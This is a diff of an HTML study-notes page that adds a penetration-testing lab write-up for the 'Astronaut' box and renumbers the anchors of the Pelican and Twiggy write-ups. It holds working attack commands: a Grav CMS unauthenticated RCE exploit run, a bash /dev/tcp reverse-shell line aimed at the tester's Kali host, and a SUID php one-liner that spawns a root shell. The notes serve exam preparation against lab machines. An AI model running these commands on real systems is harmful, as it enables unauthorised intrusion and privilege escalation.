@@ -159,7 +159,7 @@ mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-c
       <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
     </div>
     <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
-    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v10-pelican-proving-grounds-practice-linux-intermediate">Pelican  (Proving Grounds Practice · Linux · Intermediate)</a><a class="navlink lvl1" href="#v10-twiggy-proving-grounds-practice-linux-easy">Twiggy  (Proving Grounds Practice · Linux · Easy)</a></div></nav>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v10-astronaut-proving-grounds-practice-linux-intermediate">Astronaut  (Proving Grounds Practice · Linux · Intermediate)</a><a class="navlink lvl1" href="#v10-pelican-proving-grounds-practice-linux-intermediate">Pelican  (Proving Grounds Practice · Linux · Intermediate)</a><a class="navlink lvl1" href="#v10-twiggy-proving-grounds-practice-linux-easy">Twiggy  (Proving Grounds Practice · Linux · Easy)</a></div></nav>
   </aside>
   <div id="main">
     <div id="topbar">
@@ -174,13 +174,85 @@ mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-c
 <h2 id="v10--challenge-labs-boxes-my-per-box-writeups">🗂️ CHALLENGE LABS &amp; BOXES — my per-box writeups<a class="anchor" href="#v10--challenge-labs-boxes-my-per-box-writeups">#</a></h2>
 <blockquote>Every machine I&#x27;ve rooted: the attack chain, exact commands, learnings, and rabbit holes to not repeat. Source files live in <code>OSCP-Challenge-Labs/</code>; add a box there and rebuild.</blockquote>
 <hr>
+<h1 id="v10-astronaut-proving-grounds-practice-linux-intermediate">Astronaut  (Proving Grounds Practice · Linux · Intermediate)<a class="anchor" href="#v10-astronaut-proving-grounds-practice-linux-intermediate">#</a></h1>
+<ul>
+<li><strong>IP:</strong> 192.168.190.12  (host: <code>gravity</code>)   <strong>Date:</strong> 2026-10-19</li>
+<li><strong>One-line:</strong> <strong>Grav CMS</strong> unauthenticated RCE (CVE-2021-21425, scheduler YAML write) → <code>www-data</code> → **SUID <code>/usr/bin/php7.4</code>** → root in one GTFOBins command.</li>
+</ul>
+<hr>
+<h2 id="v10-1-enumeration">1. Enumeration<a class="anchor" href="#v10-1-enumeration">#</a></h2>
+<pre><code>nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP       # 22, 80
+nmap -p22,80 -sCV -Pn -oN scans/services.txt $IP
+whatweb http://$IP                                            # Apache 2.4.41 (Ubuntu)</code></pre>
+<p>Port 80 served HTML. <strong>View-source</strong> gave it away:</p>
+<pre><code>/grav-admin/                          ← Grav&#x27;s app path
+/grav-admin/user/themes/quark/js/...  ← &quot;user/themes&quot; + &quot;quark&quot; theme = Grav CMS</code></pre>
+<p><code>whatweb http://$IP/grav-admin/</code> → <code>MetaGenerator[GravCMS]</code>. <strong>Grav CMS confirmed.</strong></p>
+<blockquote>🔑 Recognition: the *paths in the page source* name the product (<code>user/themes</code>, <code>quark</code> = Grav). Same method as Subrion — read the source/headers/title.</blockquote>
+<h2 id="v10-2-foothold-www-data">2. Foothold (www-data)<a class="anchor" href="#v10-2-foothold-www-data">#</a></h2>
+<p><strong>Vector:</strong> Grav Admin plugin ≤ 1.10.7 — unauthenticated RCE (<strong>CVE-2021-21425</strong>). Grabs the <code>admin-nonce</code> from <code>/grav-admin/admin</code> (unauth), POSTs a malicious <strong>scheduler job</strong> that runs PHP → reverse shell.</p>
+<pre><code>searchsploit grav
+# pick: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) | 49876/49973.py
+#   (unauthenticated ✅ + runnable .py ✅ + RCE ✅ ; the .rb is Metasploit — skip)
+searchsploit -m 49973 ; searchsploit -x 49973      # READ it first</code></pre>
+<p>Two ways this PoC exists — <strong>check how it takes input</strong>:</p>
+<ul>
+<li><strong>argparse version:</strong> <code>python3 49973.py -u http://192.168.190.12/grav-admin/</code>  ← this is what worked</li>
+<li><strong>hardcoded version:</strong> edit <code>target=</code> + the base64 reverse-shell blob inside, then <code>python3 49973.py</code></li>
+</ul>
+<pre><code># Kali: nc -lvnp 443
+python3 49973.py -u http://192.168.190.12/grav-admin/     # → www-data shell on nc
+python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;            # stabilize (Ctrl+Z → stty raw -echo; fg → export TERM=xterm) NO Ctrl+C</code></pre>
+<ul>
+<li><strong>local.txt:</strong> <code>[captured]</code></li>
+</ul>
+<h2 id="v10-3-privilege-escalation-root">3. Privilege Escalation (root)<a class="anchor" href="#v10-3-privilege-escalation-root">#</a></h2>
+<p><strong>Dead-ends first (methodical elimination):</strong></p>
+<ul>
+<li><code>sudo -l</code> → asks for www-data&#x27;s password (it has none) → <strong>skip</strong> (don&#x27;t guess).</li>
+<li><code>getcap -r /</code> → only standard caps → nothing.</li>
+<li><code>/etc/crontab</code> → all stock run-parts → no custom root job.</li>
+<li><code>/usr/bin/pkexec</code> → **<code>-rwxr-xr-x</code> (NOT SUID), dated Feb 2022 = patched<strong> → </strong>PwnKit out.**</li>
+<li>Grav admin <strong>bcrypt</strong> hash (<code>user/accounts/*.yaml</code>, <code>$2y$10$...</code>) → crackable but <strong>only 32 H/s on CPU</strong> → too slow to rely on.</li>
+</ul>
+<p><strong>The real path — SUID php:</strong></p>
+<pre><code>find / -perm -4000 -type f 2&gt;/dev/null
+#   ... /usr/bin/php7.4   ← the odd one out (a code-running binary, SUID root)
+ls -l /usr/bin/php7.4
+#   -rwsr-xr-x  ← the &#x27;s&#x27; = SUID, owner root
+/usr/bin/php7.4 -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;      # GTFOBins (php → SUID) → root
+id                                                         # euid=0(root) 🎉
+cat /root/proof.txt</code></pre>
+<p><strong>Why it works:</strong> SUID = the binary runs as its <strong>owner (root)</strong>. <code>php</code> runs arbitrary code → <code>pcntl_exec(&#x27;/bin/sh&#x27;,[&#x27;-p&#x27;])</code> spawns a root shell. The **<code>-p</code>** is essential: it stops the shell dropping euid→ruid (without it you&#x27;d fall back to www-data).</p>
+<ul>
+<li><strong>proof.txt:</strong> <code>[captured]</code></li>
+</ul>
+<h2 id="v10-4-learnings-tips">4. Learnings &amp; tips<a class="anchor" href="#v10-4-learnings-tips">#</a></h2>
+<ul>
+<li><strong>Recognition by source paths.</strong> <code>user/themes/quark</code> → Grav. The product name leaks in source/headers/title — read them.</li>
+<li><strong>Read + adapt exploits.</strong> Public PoCs have hardcoded IPs/targets AND differ in how they take input — **<code>--help</code> / read the top** to see argparse (<code>-u</code>) vs an editable <code>target=</code> variable. Feed it the way it expects.</li>
+<li><strong>SUID on a code-running binary = instant root.</strong> php/python/perl/bash/etc. → GTFOBins → one line. The **<code>-p</code>** flag keeps euid=0.</li>
+<li>**<code>find -perm -4000</code> IS the SUID filter** — the list = all SUID files; <code>ls -l</code> to see the <code>s</code> bit.</li>
+</ul>
+<h2 id="v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them">5. Rabbit holes / mistakes (so I don&#x27;t repeat them)<a class="anchor" href="#v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them">#</a></h2>
+<ul>
+<li>⚠️ <strong>Guessed www-data&#x27;s sudo password</strong> (<code>admin</code>) — www-data has none; don&#x27;t waste attempts on <code>sudo -l</code> prompts.</li>
+<li>⚠️ <strong>Nearly sank hours into a slow bcrypt crack (32 H/s).</strong> The <strong>SUID list gave root in one command</strong> — *always run the fast checks (sudo/SUID/caps) in parallel with any slow crack; don&#x27;t block on hashcat.*</li>
+<li>⚠️ pkexec looked tempting but was <strong>patched (not SUID)</strong> — check <code>ls -l /usr/bin/pkexec</code> before assuming PwnKit.</li>
+<li>💡 <code>su</code> needs a stabilized TTY; never Ctrl+C a raw shell.</li>
+</ul>
+<h2 id="v10-6-kb-tags-used">6. KB tags used<a class="anchor" href="#v10-6-kb-tags-used">#</a></h2>
+<ul>
+<li><code class="tag">[ENUM-UNUSUAL-PORTS]</code> / recognition · <code class="tag">[WEB-QUICK]</code> · <code class="tag">[EXPLOIT-RESEARCH]</code> (read + adapt the PoC) · <code class="tag">[SHELL-QUICK]</code> / <code class="tag">[SHELL-STABILIZE]</code> · <code class="tag">[LINUX-SUID]</code> + <code class="tag">[GTFOBINS-WORKFLOW]</code> (the root) · <code class="tag">[CONCEPT-LINUX-PERMS]</code> · <code class="tag">[HASH-IDENTIFICATION]</code> (bcrypt <code>-m 3200</code>) · <code class="tag">[FLAG-HUNT]</code></li>
+</ul>
+<hr>
 <h1 id="v10-pelican-proving-grounds-practice-linux-intermediate">Pelican  (Proving Grounds Practice · Linux · Intermediate)<a class="anchor" href="#v10-pelican-proving-grounds-practice-linux-intermediate">#</a></h1>
 <ul>
 <li><strong>IP:</strong> 192.168.123.98   <strong>Date:</strong> 2026-10-12</li>
 <li><strong>One-line:</strong> Netflix <strong>Exhibitor</strong> web UI (<code>java.env</code> config-injection) → RCE as *charles* → <code>sudo gcore</code> to dump the memory of a root process literally named **<code>password-store</code>** → read the root password out of memory → <code>su root</code>.</li>
 </ul>
 <hr>
-<h2 id="v10-1-enumeration">1. Enumeration<a class="anchor" href="#v10-1-enumeration">#</a></h2>
+<h2 id="v10-1-enumeration-1">1. Enumeration<a class="anchor" href="#v10-1-enumeration-1">#</a></h2>
 <pre><code>nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
 nmap -p22,139,445,631,2181,2222,8080,8081,34051 -sCV -Pn -oN scans/services.txt $IP</code></pre>
 <div class="tablewrap"><table><thead><tr><th>Port</th><th>Service</th><th>Note</th></tr></thead><tbody>
@@ -208,7 +280,7 @@ $(/bin/bash -i &gt;&amp; /dev/tcp/&lt;KALI-IP&gt;/443 0&gt;&amp;1)
 </ul>
 <p><strong>Stabilise immediately</strong> (learned the hard way — see rabbit holes):</p>
 <pre><code>python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;   # Ctrl+Z → stty raw -echo; fg → Enter → export TERM=xterm</code></pre>
-<h2 id="v10-3-privilege-escalation-root">3. Privilege Escalation (root)<a class="anchor" href="#v10-3-privilege-escalation-root">#</a></h2>
+<h2 id="v10-3-privilege-escalation-root-1">3. Privilege Escalation (root)<a class="anchor" href="#v10-3-privilege-escalation-root-1">#</a></h2>
 <p><strong>Dead-end first (and that&#x27;s fine):</strong> <code>getcap -r /</code> showed only <code>cap_net_raw</code> (ping), <code>cap_ipc_lock</code> (keyring), <code>cap_net_bind/admin</code> (gstreamer) — <strong>none exploitable.</strong> No <code>cap_setuid</code> on a code-running binary. *Lesson: don&#x27;t force a technique; empty vector → next one.*</p>
 <p>**The real path — <code>sudo gcore</code>:**</p>
 <pre><code>sudo -l
@@ -225,21 +297,21 @@ cat /root/proof.txt</code></pre>
 <ul>
 <li><strong>proof.txt:</strong> <code>[captured]</code></li>
 </ul>
-<h2 id="v10-4-learnings-tips">4. Learnings &amp; tips<a class="anchor" href="#v10-4-learnings-tips">#</a></h2>
+<h2 id="v10-4-learnings-tips-1">4. Learnings &amp; tips<a class="anchor" href="#v10-4-learnings-tips-1">#</a></h2>
 <ul>
 <li><strong>Recognition by product name.</strong> <code>/exhibitor/</code> in a URL = the product Exhibitor. Unfamiliar string → Google it → find its exploit. You don&#x27;t need to know every app.</li>
 <li><strong>&quot;What does this tool DO as root?&quot;</strong> When <code>sudo -l</code> gives an *odd* binary, reason about its capability. <code>gcore</code> dumps memory → memory holds secrets → dump a secret-holding root process → read the credential. This mindset cracks weird privescs that aren&#x27;t on GTFOBins.</li>
 <li>**<code>ps aux</code> names are clues.** A process called <code>password-store</code> is a giant arrow. Read process lists for intent.</li>
 <li><strong>Don&#x27;t force a technique.</strong> Capabilities looked promising but were a dead end — pivoting to <code>sudo -l</code> found the real path in seconds.</li>
 </ul>
-<h2 id="v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them">5. Rabbit holes / mistakes (so I don&#x27;t repeat them)<a class="anchor" href="#v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them">#</a></h2>
+<h2 id="v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them-1">5. Rabbit holes / mistakes (so I don&#x27;t repeat them)<a class="anchor" href="#v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them-1">#</a></h2>
 <ul>
 <li>⚠️ <strong>Ctrl+C killed my reverse shell.</strong> In an unstabilised shell there&#x27;s no job control, so <strong>Ctrl+C drops the whole connection.</strong> After that, commands I typed ran on <strong>Kali</strong> by mistake (<code>gcore: command not found</code>, <code>No such file</code>). → **Always stabilise (python pty + <code>stty raw -echo</code>) before doing anything, and never Ctrl+C a raw shell.**</li>
 <li>⚠️ **<code>su</code> needs a real TTY.** In a dumb shell the password prompt misbehaves → stabilise first, *then* <code>su root</code>.</li>
 <li>⚠️ <strong>SSH-key route hit a booby-trapped login.</strong> Planting my key worked (auth succeeded), but charles&#x27;s login ran a bogus <code>foo</code> command and the server denied a PTY (<code>PTY allocation request failed</code>) → session died. Bypass = <code>ssh -i key charles@IP -tt &quot;bash --noprofile --norc&quot;</code>. In the end, <strong>restarting the lab + re-running the Exhibitor reverse shell</strong> (then stabilising) was the clean way back in.</li>
 <li>🐇 Ignore CUPS (631), Java RMI (34051), Samba — all distractions on this box.</li>
 </ul>
-<h2 id="v10-6-kb-tags-used">6. KB tags used<a class="anchor" href="#v10-6-kb-tags-used">#</a></h2>
+<h2 id="v10-6-kb-tags-used-1">6. KB tags used<a class="anchor" href="#v10-6-kb-tags-used-1">#</a></h2>
 <ul>
 <li><code class="tag">[ENUM-UNUSUAL-PORTS]</code> (identify Exhibitor) · <code class="tag">[WEB-QUICK]</code> · <code class="tag">[SHELL-QUICK]</code> / <code class="tag">[SHELL-STABILIZE]</code> (the Ctrl+C lesson) · <code class="tag">[REVERSE-SHELL-NOT-CONNECTING]</code> · <code class="tag">[LINUX-SUDO]</code> (sudo gcore) · <code class="tag">[LINUX-CAP]</code> (the dead-end check) · <code class="tag">[LINUX-CREDS]</code> · <code class="tag">[FLAG-HUNT]</code></li>
 </ul>
@@ -250,7 +322,7 @@ cat /root/proof.txt</code></pre>
 <li><strong>One-line:</strong> Spotted SaltStack by its 4505/4506 ZeroMQ ports → unauth RCE (CVE-2020-11651) → salt-master runs as <strong>root</strong> → read the flag directly.</li>
 </ul>
 <hr>
-<h2 id="v10-1-enumeration-1">1. Enumeration<a class="anchor" href="#v10-1-enumeration-1">#</a></h2>
+<h2 id="v10-1-enumeration-2">1. Enumeration<a class="anchor" href="#v10-1-enumeration-2">#</a></h2>
 <p><strong>All-ports scan:</strong></p>
 <pre><code>nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
 # open: 22, 53, 80, 4505, 4506, 8000
